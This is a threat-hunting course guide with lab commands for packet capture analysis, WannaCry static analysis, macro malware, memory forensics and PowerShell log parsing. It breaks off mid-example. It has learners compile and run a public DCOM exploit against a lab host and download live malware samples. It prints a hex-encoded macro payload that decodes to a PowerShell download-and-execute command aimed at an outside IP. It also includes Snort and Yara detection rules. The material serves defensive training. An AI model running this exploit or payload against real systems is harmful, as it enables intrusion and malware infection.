
                            #####################################
----------- ############### # Day 1: Threat Hunting on the wire  ################ -----------
                            #####################################
 

###################################
# Setting up your virtual machine #
# Note: run as root user          #
###################################
 
 
Here is where we will setup all of the required dependencies for the tools we plan to install
---------------------------Type this as root--------------------------
apt update
apt-get install -y libpcre3-dbg libpcre3-dev autoconf automake libtool libpcap-dev libnet1-dev libyaml-dev libjansson4 libcap-ng-dev libmagic-dev libjansson-dev zlib1g-dev libnetfilter-queue-dev libnetfilter-queue1 libnfnetlink-dev cmake make gcc g++ flex bison libpcap-dev libssl-dev unzip python-dev swig zlib1g-dev sendmail sendmail-bin prads tcpflow python-scapy python-yara tshark whois jq
-----------------------------------------------------------------------
 
 
 
 
Now we install Suricata
---------------------------Type this  as root-------------------------------
wget https://www.openinfosecfoundation.org/download/suricata-4.0.5.tar.gz
 
tar -zxvf suricata-4.0.5.tar.gz
 
cd suricata-4.0.5
 
./configure --enable-nfqueue --prefix=/usr --sysconfdir=/etc --localstatedir=/var
 
make
 
make install
 
make install-conf
 
cd rules
 
cp *.rules /etc/suricata/rules/
 
cd /etc/suricata/
 
wget https://rules.emergingthreats.net/open/suricata-4.0/emerging.rules.tar.gz
 
tar -zxvf emerging.rules.tar.gz
-----------------------------------------------------------------------
 
 
 
 
 
##################################################################
# Analyzing a PCAP Prads                                         #
# Note: run as regular user                                      #
##################################################################
 
---------------------------Type this as a regular user----------------------------------
cd ~
 
mkdir pcap_analysis/
 
cd ~/pcap_analysis/
 
mkdir prads
 
cd ~/pcap_analysis/prads
 
wget http://45.63.104.73/suspicious-time.pcap
 
prads -r suspicious-time.pcap -l prads-asset.log
 
cat prads-asset.log | less
 
cat prads-asset.log | grep SYN | grep -iE 'windows|linux'
 
cat prads-asset.log | grep CLIENT | grep -iE 'safari|firefox|opera|chrome'
 
cat prads-asset.log | grep SERVER | grep -iE 'apache|linux|ubuntu|nginx|iis'
-----------------------------------------------------------------------
 
 
 
 
##################################
# PCAP Analysis with ChaosReader #
# Note: run as regular user      #
##################################
---------------------------Type this as a regular user----------------------------------
cd ~
 
mkdir -p pcap_analysis/chaos_reader/
 
cd ~/pcap_analysis/chaos_reader/
 
wget http://45.63.104.73/suspicious-time.pcap
 
wget http://45.63.104.73/chaosreader.pl

perl chaosreader.pl suspicious-time.pcap
 
cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
 
cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
 
 
for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
 
python -m SimpleHTTPServer    
          ****** Open a web browser and browse the the IP address of your Linux machine port 8000 for the web page *****
 
------------------------------------------------------------------------
 
 
 
 
 
 
 
 
#############################
# PCAP Analysis with tshark #
# Note: run as regular user #
#############################
---------------------------Type this as a regular user---------------------------------
cd ~/pcap_analysis/
 
mkdir tshark
 
cd ~/pcap_analysis/tshark
 
wget http://45.63.104.73/suspicious-time.pcap
 
tshark -i ens3 -r suspicious-time.pcap -qz io,phs
 
tshark -r suspicious-time.pcap -qz ip_hosts,tree
 
tshark -r suspicious-time.pcap -Y "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
 
tshark -r suspicious-time.pcap -Y "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
 
 
tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}'
 
whois rapidshare.com.eyu32.ru
 
whois sploitme.com.cn
 
tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
 
tshark -r suspicious-time.pcap -qz http_req,tree
 
tshark -r suspicious-time.pcap -Y "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
 
tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
------------------------------------------------------------------------
 
 

#############################
# Understanding Snort rules #
#############################
Field 1: Action - Snort can process events in 1 of 3 ways (alert, log, drop)
 
Field 2: Protocol - Snort understands a few types of traffic (tcp, udp, icmp)
 
Field 3: Source IP (can be a variable like $External_Net, or an IP, or a range)
 
Field 4: Source Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
 
Field 5: Traffic Direction (->)
 
Field 6: Destination IP (can be a variable like $External_Net, or an IP, or a range)
 
Field 7: Destination Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
 
Field 8: MSG - what is actually displayed on the analysts machine
 
 
Let's look at 2 simple rules
----------------------------------------------------------------------------------
alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:”NETBIOS DCERPC ISystemActivator \
bind attempt”; flow:to_server,established; content:”|05|”; distance:0; within:1; \
content:”|0b|”; distance:1; within:1; byte_test:1,&,1,0,relative; content:”|A0 01 00 \
00 00 00 00 00 C0 00 00 00 00 00 00 46|”; distance:29; within:16; \
reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2192; rev:1;)
 
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:”NETBIOS SMB DCERPC ISystemActivator bind \
attempt”; flow:to_server,established; content:”|FF|SMB|25|”; nocase; offset:4; \
depth:5; content:”|26 00|”; distance:56; within:2; content:”|5c \
00|P|00|I|00|P|00|E|00 5c 00|”; nocase; distance:5; within:12; content:”|05|”; \
distance:0; within:1; content:”|0b|”; distance:1; within:1; \
byte_test:1,&,1,0,relative; content:”|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 \
46|”; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; \
sid:2193; rev:1;)
----------------------------------------------------------------------------------
 
 
 
From your Linux machine ping your Windows machine
---------------------------Type This-----------------------------------
ping 192.168.150.1
-----------------------------------------------------------------------
 
 
Start wireshark and let's create some simple filters:
 
Filter 1:
ip.addr==192.168.150.1
-----------------------------------------------------------------------
 
Filter 2:
ip.addr==192.168.150.1 && icmp
-----------------------------------------------------------------------
 
 
Filter 3:
ip.addr==192.168.150.1 && !(tcp.port==22)
-----------------------------------------------------------------------
Now stop your capture and restart it (make sure you keep the filter)
 
 
 
 
Back to your Linux machine:
[ CTRL-C ] - to stop your ping
 
wget http://downloads.securityfocus.com/vulnerabilities/exploits/oc192-dcom.c
 
 
gcc -o exploit oc192-dcom.c
 
./exploit
 
 
./exploit -d 192.168.150.1 -t 0
-----------------------------------------------------------------------
 
 
 
Now go back to WireShark and stop the capture.
 
 
 
 
 
###############################
# PCAP Analysis with Suricata #
# Note: run as root           #
###############################
--------------------------Type this as root--------------------------------
cd /home/joe/pcap_analysis/
 
mkdir suricata
 
cd suricata/
 
wget http://45.63.104.73/suspicious-time.pcap
 
mkdir suri
 
suricata -c /etc/suricata/suricata.yaml -r suspicious-time.pcap -l suri/
 
cd suri/
 
cat stats.log | less
 
cat eve.json |grep -E "e\":\"http"|jq ".timestamp,.http"|csplit - /..T..:/ {*}
 
cat xx01
 
cat xx02
 
cat xx03
 
cat xx04
 
cat xx05
 
cat xx06
------------------------------------------------------------------------
 
 
#############################
# PCAP Analysis with Yara   #
# Note: run as regular user #
#############################
-------------------------Type this as a regular user----------------------------------
cd ~/pcap_analysis/
 
git clone https://github.com/kevthehermit/YaraPcap.git
cd YaraPcap/
wget http://45.63.104.73/suspicious-time.pcap
wget https://github.com/Yara-Rules/rules/archive/master.zip
unzip master.zip
cd rules-master/
ls
cat index.yar
clear
./index_gen.sh
cd ..
mkdir matching_files/
python yaraPcap.py rules-master/index.yar suspicious-time.pcap -s matching_files/
whereis tcpflow
vi yaraPcap.py        **** fix line 35 with correct path to tcpflow ****:q!
python yaraPcap.py rules-master/index.yar suspicious-time.pcap -s matching_files/
cd matching_files/
ls
cat report.txt
------------------------------------------------------------------------



                            ###############################################
----------- ############### # Day 2: Threat Hunting with Static Analysis  ################ -----------
                            ###############################################
 



###################################
# Setting up your virtual machine #
###################################
 
Here is where we will setup all of the required dependencies for the tools we plan to install
---------------------------Type This-----------------------------------
sudo apt update
sudo apt-get install -y python3-pip python3-dev unzip python3-setuptools ipython3 build-essential python-pefile python2.7 python-pip python-setuptools mysql-server build-dep python-mysqldb python-mysqldb
 
 
sudo pip install -U olefile
 
 
git clone https://github.com/Te-k/pe.git
cd pe
sudo python3 setup.py install
pip3 install .
cd ..
wget http://45.63.104.73/wannacry.zip
     infected
-----------------------------------------------------------------------
 
 
 
 
################
# The Scenario #
################
You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
 
 
The fastest thing you can do is perform static analysis.
 
 
 
###################
# Static Analysis #
###################
 
- After logging please open a terminal window and type the following commands:
 
 
---------------------------Type This-----------------------------------
cd ~
 
mkdir static_analysis
 
cd static_analysis
 
wget http://45.63.104.73/wannacry.zip
 
unzip wannacry.zip
     infected
 
file wannacry.exe
 
mv wannacry.exe malware.pdf
 
file malware.pdf
 
mv malware.pdf wannacry.exe
 
hexdump -n 2 -C wannacry.exe
 
----------------------------------------------------------------------
 
 
***What is '4d 5a' or 'MZ'***
Reference:
http://www.garykessler.net/library/file_sigs.html
 
 
 
 
---------------------------Type This-----------------------------------
objdump -x wannacry.exe
 
strings wannacry.exe
 
strings wannacry.exe | grep -i dll
 
strings wannacry.exe | grep -i library
 
strings wannacry.exe | grep -i reg
 
strings wannacry.exe | grep -i key
 
strings wannacry.exe | grep -i rsa
 
strings wannacry.exe | grep -i open
 
strings wannacry.exe | grep -i get
 
strings wannacry.exe | grep -i mutex
 
strings wannacry.exe | grep -i irc
 
strings wannacry.exe | grep -i join        
 
strings wannacry.exe | grep -i admin
 
strings wannacry.exe | grep -i list
----------------------------------------------------------------------
 
 
 
 
 
---------------------------Type This-----------------------------------
pe info wannacry.exe
pe check wannacry.exe
pe dump --section text wannacry.exe
pe dump --section data wannacry.exe
pe dump --section rsrc wannacry.exe
pe dump --section reloc wannacry.exe
strings rdata | less
strings rsrc | less
strings text | less
----------------------------------------------------------------------
 
 
 
 
 
 
 
 
Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
 
Quick Google search for "wannacry ransomeware analysis"
 
 
Reference
https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
 
- Yara Rule -
 
 
Strings:
$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
$s2 = “Wanna Decryptor” wide ascii nocase
$s3 = “.wcry” wide ascii nocase
$s4 = “WANNACRY” wide ascii nocase
$s5 = “WANACRY!” wide ascii nocase
$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
 
 
 
 
 
 
 
 
Ok, let's look for the individual strings
 
 
---------------------------Type This-----------------------------------
strings wannacry.exe | grep -i ooops
 
strings wannacry.exe | grep -i wanna
 
strings wannacry.exe | grep -i wcry
 
strings wannacry.exe | grep -i wannacry
 
strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
----------------------------------------------------------------------
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
####################################
# Tired of GREP - let's try Python #
####################################
Decided to make my own script for this kind of stuff in the future. I
 
Reference1:
https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
 
This is a really good script for the basics of static analysis
 
Reference:
https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
 
 
This is really good for showing some good signatures to add to the Python script
 
 
Here is my own script using the signatures (started this yesterday, but still needs work):
https://pastebin.com/guxzCBmP
 
 
 
---------------------------Type This-----------------------------------
wget https://pastebin.com/raw/guxzCBmP
 
 
mv guxzCBmP am.py
 
 
vi am.py
 
python2.7 am.py wannacry.exe
----------------------------------------------------------------------
 
 
 
##############
# Yara Ninja #
##############
 
Reference:
https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
 
----------------------------------------------------------------------------
rule wannacry_1 : ransom
{
    meta:
        author = "Joshua Cannell"
        description = "WannaCry Ransomware strings"
        weight = 100
        date = "2017-05-12"
 
    strings:
        $s1 = "Ooops, your files have been encrypted!" wide ascii nocase
        $s2 = "Wanna Decryptor" wide ascii nocase
        $s3 = ".wcry" wide ascii nocase
        $s4 = "WANNACRY" wide ascii nocase
        $s5 = "WANACRY!" wide ascii nocase
        $s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
 
    condition:
        any of them
}
 
----------------------------------------------------------------------------
rule wannacry_2{
    meta:
        author = "Harold Ogden"
        description = "WannaCry Ransomware Strings"
        date = "2017-05-12"
        weight = 100
 
    strings:
        $string1 = "msg/m_bulgarian.wnry"
        $string2 = "msg/m_chinese (simplified).wnry"
        $string3 = "msg/m_chinese (traditional).wnry"
        $string4 = "msg/m_croatian.wnry"
        $string5 = "msg/m_czech.wnry"
        $string6 = "msg/m_danish.wnry"
        $string7 = "msg/m_dutch.wnry"
        $string8 = "msg/m_english.wnry"
        $string9 = "msg/m_filipino.wnry"
        $string10 = "msg/m_finnish.wnry"
        $string11 = "msg/m_french.wnry"
        $string12 = "msg/m_german.wnry"
        $string13 = "msg/m_greek.wnry"
        $string14 = "msg/m_indonesian.wnry"
        $string15 = "msg/m_italian.wnry"
        $string16 = "msg/m_japanese.wnry"
        $string17 = "msg/m_korean.wnry"
        $string18 = "msg/m_latvian.wnry"
        $string19 = "msg/m_norwegian.wnry"
        $string20 = "msg/m_polish.wnry"
        $string21 = "msg/m_portuguese.wnry"
        $string22 = "msg/m_romanian.wnry"
        $string23 = "msg/m_russian.wnry"
        $string24 = "msg/m_slovak.wnry"
        $string25 = "msg/m_spanish.wnry"
        $string26 = "msg/m_swedish.wnry"
        $string27 = "msg/m_turkish.wnry"
        $string28 = "msg/m_vietnamese.wnry"
 
 
    condition:
        any of ($string*)
}
----------------------------------------------------------------------------
 
 
 
 
 
 
 
#####################################################
# Analyzing Macro Embedded Malware                  #
#####################################################
---------------------------Type This-----------------------------------
mkdir ~/oledump
 
cd ~/oledump
 
wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
 
unzip oledump_V0_0_22.zip
 
wget http://45.63.104.73/064016.zip
 
unzip 064016.zip
     infected
 
python oledump.py 064016.doc
 
python oledump.py 064016.doc -s A4 -v
 -----------------------------------------------------------------------
 
 
 
- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
 
---------------------------Type This-----------------------------------
python oledump.py 064016.doc -s A5 -v
-----------------------------------------------------------------------
 
- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
 
---------------------------Type This-----------------------------------
python oledump.py 064016.doc -s A3 -v
 
- Look for "GVhkjbjv" and you should see:
 
636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
 
- Take that long blob that starts with 636D and finishes with 653B and paste it in:
http://www.rapidtables.com/convert/number/hex-to-ascii.htm
-----------------------------------------------------------------------
 
 
 
###############################
# Creating a Malware Database #
###############################
Creating a malware database (mysql)
-----------------------------------
- Step 1: Logging in
Run the following command in the terminal:
---------------------------Type This-----------------------------------
mysql -u root -p                    (set a password of 'malware')
 
- Then create one database by running following command:
 
create database malware;
 
exit;
 
wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
 
vi mal_to_db.py                     (fill in database connection information)
 
python mal_to_db.py -i
 
------- check it to see if the files table was created ------
 
mysql -u root -p
    malware
 
show databases;
 
use malware;
 
show tables;
 
describe files;
 
exit;
 
---------------------------------
 
 
- Now add the malicious file to the DB
---------------------------Type This-----------------------------------
python mal_to_db.py -f wannacry.exe -u
 
 
 
- Now check to see if it is in the DB
---------------------------Type This-----------------------------------
mysql -u root -p
    malware
 
mysql> use malware;
 
select id,md5,sha1,sha256,time FROM files;
 
mysql> quit;
-----------------------------------------------------------------------




                            ###############################################
----------- ############### # Day 3: Threat hunting with memory analysis  ################ -----------
                            ###############################################
 




###################################
# Setting up your virtual machine #
###################################
 
Here is where we will setup all of the required dependencies for the tools we plan to install
---------------------------Type This-----------------------------------
apt update
apt-get install -y foremost tcpxtract python-openpyxl python-ujson python-ujson-dbg python-pycryptopp python-pycryptopp-dbg libdistorm3-3 libdistorm3-dev python-distorm3 volatility volatility-tools
-----------------------------------------------------------------------
 
 
 
 
################
# The Scenario #
################
 
 
###################
# Memory Analysis #
###################
---------------------------Type This-----------------------------------
cd  ~/
 
mkdir mem_analysis
 
cd mem_analysis
 
wget http://45.63.104.73/hn_forensics.vmem
 
volatility pslist -f hn_forensics.vmem
volatility pslist -f hn_forensics.vmem | awk '{print $2,$3,$4}'
volatility pslist -f hn_forensics.vmem | awk '{print $2,"\t\t"$3"\t\t","\t\t"$4}'
volatility connscan -f hn_forensics.vmem
volatility connscan -f hn_forensics.vmem | grep -E '888|1752'
 
mkdir malfind/
mkdir dump/
mkdir -p output/pdf/
 
volatility privs -f hn_forensics.vmem
volatility svcscan -f hn_forensics.vmem
volatility malfind -f hn_forensics.vmem  --dump-dir malfind/
 
 
volatility  -f hn_forensics.vmem memdump -p 888 --dump-dir dump/
volatility  -f hn_forensics.vmem memdump -p 1752 --dump-dir dump/
 
                ***Takes a few min***
 
cd dump/
strings 1752.dmp | grep "^http://" | sort | uniq
strings 1752.dmp | grep "Ahttps://" | uniq -u
 
foremost -i 1752.dmp -t pdf -o ../output/pdf/
cd ../output/pdf/
cat audit.txt
cd pdf
ls
grep -i javascript *.pdf
 
 
wget http://didierstevens.com/files/software/pdf-parser_V0_6_4.zip
unzip pdf-parser_V0_6_4.zip
python pdf-parser.py -s javascript --raw 00601560.pdf
python pdf-parser.py --object 11 00601560.pdf
python pdf-parser.py --object 1054 --raw --filter 00601560.pdf > malicious.js
 
cat malicious.js
 -----------------------------------------------------------------------



                            ############################################
----------- ############### # Day 4: Threat Hunting with log analysis  ################ -----------
                            ############################################

#####################
# Powershell Basics #
#####################
 
PowerShell is Microsoft's new scripting language that has been built in since the release Vista.
 
PowerShell file extension end in .ps1 .
 
An important note is that you cannot double click on a PowerShell script to execute it.
 
To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
 
------------------------Type This------------------------------
cd c:\
dir
cd
ls
---------------------------------------------------------------
 
 
To obtain a list of cmdlets, use the Get-Command cmdlet
------------------------Type This------------------------------
Get-Command
---------------------------------------------------------------
 
 
You can use the Get-Alias cmdlet to see a full list of aliased commands.
------------------------Type This------------------------------
Get-Alias
---------------------------------------------------------------
 
 
Don't worry you won't blow up your machine with Powershell
------------------------Type This------------------------------
Get-Process | stop-process              Don't press [ ENTER ] What will this command do?
Get-Process | stop-process -whatif
---------------------------------------------------------------
 
To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
------------------------Type This------------------------------
Get-Help Get-Command
 
Get-Help Get-Service –online
 
Get-Service -Name TermService, Spooler
 
Get-Service –N BITS
---------------------------------------------------------------
 
 
 
 
 
- Run cmdlet through a pie and refer to its properties as $_
------------------------Type This------------------------------
Get-Service | where-object {  $_.Status -eq "Running"}
---------------------------------------------------------------
 
 
 
- PowerShell variables begin with the $ symbol. First lets create a variable
------------------------Type This------------------------------
$serv = Get-Service –N Spooler
---------------------------------------------------------------
 
To see the value of a variable you can just call it in the terminal.
------------------------Type This------------------------------
$serv
 
$serv.gettype().fullname
---------------------------------------------------------------
 
 
Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
------------------------Type This------------------------------
$serv | Get-Member
 
Get-Member -InputObject $serv
---------------------------------------------------------------
 
 
 
 
Let's use a method and a property with our object.
------------------------Type This------------------------------
$serv.Status
$serv.Stop()
$serv.Refresh()
$serv.Status
$serv.Start()
$serv.Refresh()
$serv.Status
---------------------------------------------------------------
 
 
If you want some good command-line shortcuts you can check out the following link:
https://technet.microsoft.com/en-us/library/ff678293.aspx
 
#############################
# Simple Event Log Analysis #
#############################
 
Step 1: Dump the event logs
---------------------------
The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
 
To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
------------------------Type This------------------------------
Get-EventLog -LogName application | Export-Clixml Applog.xml
 
type .\Applog.xml
 
$logs = "system","application","security"
---------------------------------------------------------------
 
 
The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
------------------------Type This------------------------------
$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
---------------------------------------------------------------
 
 
 
 
Step 2: Import the event log of interest
----------------------------------------
To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
Store the results in a variable.
Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
 
The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
------------------------Type This------------------------------
$seclog = Import-Clixml security.xml
 
$seclog | select -Last 5
---------------------------------------------------------------
 
Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
------------------------Type This------------------------------
Get-EventLog Application -After (Get-Date).AddDays(-1)
---------------------------------------------------------------
You can use '-after' and '-before' to filter date ranges
 
One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
By default, an ordinary user does not have permission to read the security log.
 
 
 
 
Step 3: Drill into a specific entry
-----------------------------------
To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
 
------------------------Type This------------------------------
$seclog | select -first 1 | fl *
---------------------------------------------------------------
 
The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
 
------------------------Type This------------------------------
($seclog | select -first 1).message
 
(($seclog | select -first 1).message).gettype()
---------------------------------------------------------------
 
 
In the *nix world you often want a count of something (wc -l).
How often is the SeSecurityPrivilege privilege mentioned in the message property?
To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
------------------------Type This------------------------------
$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
---------------------------------------------------------------
If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
 
------------------------Type This------------------------------
$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
---------------------------------------------------------------
 
Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
Use the count property to determine the total number of entries in the event log.
------------------------Type This------------------------------
$seclog.Count
---------------------------------------------------------------
 
 
 
 
 
############################
# Simple Log File Analysis #
############################
 
 
You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
 
------------------------Type This------------------------------
mkdir c:\ps
cd c:\ps
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
---------------------------------------------------------------
 
 
 
The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
------------------------Type This------------------------------
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
---------------------------------------------------------------
 
 
 
To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
------------------------Type This------------------------------
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
---------------------------------------------------------------
 
 
To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
------------------------Type This------------------------------
Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
---------------------------------------------------------------
 
 
Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
------------------------Type This------------------------------
Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
---------------------------------------------------------------
 
In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
------------------------Type This------------------------------
Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
---------------------------------------------------------------
 
 
 
##############################################
# Parsing Log files using windows PowerShell #
##############################################
 
Download the sample IIS log http://pastebin.com/LBn64cyA
 
------------------------Type This------------------------------
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
 
Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
---------------------------------------------------------------
 
 
The above command would give us all the WebDAV requests.
 
To filter this to a particular user name, use the below command:
------------------------Type This------------------------------
Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
---------------------------------------------------------------
 
 
Some more options that will be more commonly required :
 
For Outlook Web Access : Replace WebDAV with OWA
 
For EAS : Replace WebDAV with Microsoft-server-activesync
 
For ECP : Replace WebDAV with ECP
 
 
 
 
 
 
 
####################################################################
# Windows PowerShell: Extracting Strings Using Regular Expressions #
####################################################################
 
 
Regex Characters you might run into:
 
^   Start of string, or start of line in a multiline pattern
$   End  of string, or start of line in a multiline pattern
\b  Word boundary
\d  Digit
\   Escape the following character
*   0 or more   {3} Exactly 3
+   1 or more   {3,}    3 or more
?   0 or 1      {3,5}   3, 4 or 5
 
 
 
To build a script that will extract data from a text file and place the extracted text into another file, we need three main elements:
 
1) The input file that will be parsed
------------------------Type This------------------------------
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=rDN3CMLc", "c:\ps\emails.txt")
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=XySD8Mi2", "c:\ps\ip_addresses.txt")
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=v5Yq66sH", "c:\ps\URL_addresses.txt")
---------------------------------------------------------------
2) The regular expression that the input file will be compared against
 
3) The output file for where the extracted data will be placed.
 
Windows PowerShell has a "select-string" cmdlet which can be used to quickly scan a file to see if a certain string value exists.
Using some of the parameters of this cmdlet, we are able to search through a file to see whether any strings match a certain pattern, and then output the results to a separate file.
 
To demonstrate this concept, below is a Windows PowerShell script I created to search through a text file for strings that match the Regular Expression (or RegEx for short) pattern belonging to e-mail addresses.
------------------------Type This------------------------------
$input_path = 'c:\ps\emails.txt'
$output_file = 'c:\ps\extracted_addresses.txt'
$regex = '\b[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b'
select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
---------------------------------------------------------------
 
 
In this script, we have the following variables:
 
1) $input_path to hold the path to the input file we want to parse
 
2) $output_file to hold the path to the file we want the results to be stored in
 
3) $regex to hold the regular expression pattern to be used when the strings are being matched.
 
The select-string cmdlet contains various parameters as follows:
 
1) "-Path" which takes as input the full path to the input file
 
2) "-Pattern" which takes as input the regular expression used in the matching process
 
3) "-AllMatches" which searches for more than one match (without this parameter it would stop after the first match is found) and is piped to "$.Matches" and then "$_.Value" which represent using the current values of all the matches.
 
Using ">" the results are written to the destination specified in the $output_file variable.
 
Here are two further examples of this script which incorporate a regular expression for extracting IP addresses and URLs.
 
IP addresses
------------
For the purposes of this example, I ran the tracert command to trace the route from my host to google.com and saved the results into a file called ip_addresses.txt. You may choose to use this script for extracting IP addresses from router logs, firewall logs, debug logs, etc.
------------------------Type This------------------------------
$input_path = 'c:\ps\ip_addresses.txt'
$output_file = 'c:\ps\extracted_ip_addresses.txt'
$regex = '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
---------------------------------------------------------------
 
 
 
URLs
----
For the purposes of this example, I created a couple of dummy web server log entries and saved them into URL_addresses.txt.
You may choose to use this script for extracting URL addresses from proxy logs, network packet capture logs, debug logs, etc.
------------------------Type This------------------------------
$input_path = 'c:\ps\URL_addresses.txt'
$output_file = 'c:\ps\extracted_URL_addresses.txt'
